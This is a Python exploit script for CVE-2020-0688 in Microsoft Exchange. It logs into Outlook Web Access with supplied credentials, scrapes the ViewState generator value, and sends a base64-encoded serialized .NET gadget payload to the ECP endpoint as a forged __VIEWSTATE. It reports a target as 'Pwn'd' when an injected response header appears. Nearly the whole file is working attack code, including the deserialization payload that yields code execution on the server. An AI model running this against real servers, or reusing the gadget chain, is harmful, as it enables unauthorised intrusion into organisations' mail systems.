#!/usr/bin/env python
import requests as req
import readline
import argparse
import re
import sys
import urllib3
from urllib.parse import urlparse
from urllib.parse import quote
from http.cookies import SimpleCookie
urllib3.disable_warnings()


def get_value(url, user, pwd, timeout):
	print("[*] Tring to login owa...")
	tmp = urlparse(url)
	base_url = "{}://{}".format(tmp.scheme, tmp.netloc)
	# paramsPost = {"password": ""+pwd+"", "isUtf8": "1", "passwordText": "", "trusted": "4",
	# 		   "destination": ""+url+"", "flags": "4", "forcedownlevel": "0", "username": ""+user+""}
	paramsPost = '''password={}&isUtf8=1&passwordText=&trusted=4&destination={}&flags=4&forcedownlevel=0&username={}'''.format(
            pwd, url, user)
	headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0","Content-Type": "application/x-www-form-urlencoded"}
	login_url = base_url + '/owa/auth.owa'
	print("[+] Login url: {}".format(login_url))
	login_cookie = ""
	try:
		resp = req.post(login_url, data=paramsPost,
                  headers=headers, verify=False, timeout=timeout, allow_redirects=False)
		print("[*] Status code:   %i" % resp.status_code)
		if "cadataKey" not in str(resp.headers) or "Set-Cookie" not in resp.headers:
			print("[!] Login Incorrect, please try again with a different account..")
			sys.exit(1)
		#print(str(response.text))
		cookies = resp.headers['Set-Cookie'].split(",")
		for c in cookies:
			login_cookie += c.lstrip().split(" ")[0] + " "
		login_cookie += "ASP.NET_SessionId=;"
	except Exception as e:
		print("[!] login error , error: {}".format(e))
		sys.exit(1)
	
	print("[+] Login successfully! ")
	try:
		target_url = "{}/ecp/default.aspx".format(base_url)
		new_response = req.get(target_url, verify=False, timeout=timeout)
		view = re.compile(
			'id="__VIEWSTATEGENERATOR" value="(.+?)"').findall(str(new_response.text))[0]
		print("[+] Done! __VIEWSTATEGENERATOR: {}".format(view))
	except:
		view = "B97B4E27"
	return view, base_url, login_cookie


def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("-s", "--server", required=True,
						help="ECP Server URL Example: http://ip/owa")
	parser.add_argument("-u", "--user", required=True,
						help="login account Example: domain\\user")
	parser.add_argument("-p", "--password", required=True, help="Password")
	parser.add_argument(
		"-t", "--timeout", help="Timeout", default='30')
	args = parser.parse_args()
	url = args.server
	print("[*] Start to exploit..")
	user = args.user
	pwd = args.password
	timeout = int(args.timeout)
	view, base_url, login_cookie = get_value(url, user, pwd, timeout)
	# from https://github.com/zcgonvh/CVE-2020-0688
	out_payload = "/wEymAkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC6BzxSZXNvdXJjZURpY3Rpb25hcnkgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiIHhtbG5zOnM9ImNsci1uYW1lc3BhY2U6U3lzdGVtO2Fzc2VtYmx5PW1zY29ybGliIiB4bWxuczp3PSJjbHItbmFtZXNwYWNlOlN5c3RlbS5XZWI7YXNzZW1ibHk9U3lzdGVtLldlYiI+PE9iamVjdERhdGFQcm92aWRlciB4OktleT0iYSIgT2JqZWN0SW5zdGFuY2U9Int4OlN0YXRpYyB3Okh0dHBDb250ZXh0LkN1cnJlbnR9IiBNZXRob2ROYW1lPSIiPjwvT2JqZWN0RGF0YVByb3ZpZGVyPjxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9ImIiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgYX0iIE1ldGhvZE5hbWU9ImdldF9SZXNwb25zZSI+PC9PYmplY3REYXRhUHJvdmlkZXI+PE9iamVjdERhdGFQcm92aWRlciB4OktleT0iYyIgT2JqZWN0SW5zdGFuY2U9IntTdGF0aWNSZXNvdXJjZSBifSIgTWV0aG9kTmFtZT0iZ2V0X0hlYWRlcnMiPjwvT2JqZWN0RGF0YVByb3ZpZGVyPjxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9ImQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgY30iIE1ldGhvZE5hbWU9IkFkZCI+PE9iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPjxzOlN0cmluZz5YLVpDRy1URVNUPC9zOlN0cmluZz48czpTdHJpbmc+Q1ZFLTIwMjAtMDY4ODwvczpTdHJpbmc+PC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJlIiBPYmplY3RJbnN0YW5jZT0ie1N0YXRpY1Jlc291cmNlIGJ9IiBNZXRob2ROYW1lPSJFbmQiPjwvT2JqZWN0RGF0YVByb3ZpZGVyPjwvUmVzb3VyY2VEaWN0aW9uYXJ5PguiWEsRz0bNLTCuxZ4yOnVoyZanTg=="
	final_exp = "{}/ecp/default.aspx?__VIEWSTATEGENERATOR={}&__VIEWSTATE={}".format(
		base_url, view, quote(out_payload))
	print("[*] Trigger payload..")
	#proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
	cookie = SimpleCookie()
	cookie.load(login_cookie)
	cookies = {}
	for key, morsel in cookie.items():
		cookies[key] = morsel.value
	resp = req.get(final_exp, verify=False, timeout=timeout,
                allow_redirects=False, cookies=cookies)
	if "X-ZCG-TEST" in resp.headers:
		print("\n[+] Pwn ! Target {}  was vulnerable !".format(url))
	else:
		print("\n[!] No vulnerable found.")

if __name__ == "__main__":
	main()
